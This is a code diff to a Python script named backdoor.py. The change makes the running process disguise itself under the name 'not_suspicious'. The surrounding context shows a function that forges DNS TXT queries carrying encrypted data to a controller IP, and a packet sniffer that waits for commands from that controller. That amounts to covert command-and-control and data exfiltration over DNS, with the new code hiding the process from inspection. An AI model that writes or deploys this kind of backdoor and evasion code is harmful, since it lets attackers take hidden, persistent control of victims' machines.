@@ -7,6 +7,7 @@ from random import randint
 import argparse
 from ipaddress import ip_address, IPv6Address
 from sys import exit
+from setproctitle import setproctitle, getproctitle
 
 # Command Line Arguments
 parser = argparse.ArgumentParser("./backdoor.py")
@@ -69,8 +70,8 @@ def forge_dns_query(data: str):
     query = IP(dst=CONTROLLER_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
     return query
 
-def hide_process_name():
-    pass
+def hide_process_name(name: str):
+    setproctitle(name)
 
 def handle_list_command():
     pass
@@ -119,6 +120,6 @@ def packet_handler(pkt):
 
 if __name__ == "__main__":
     # Hide process name.
-    hide_process_name()
+    hide_process_name("not_suspicious")
     # Start listening for packets.
     sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)
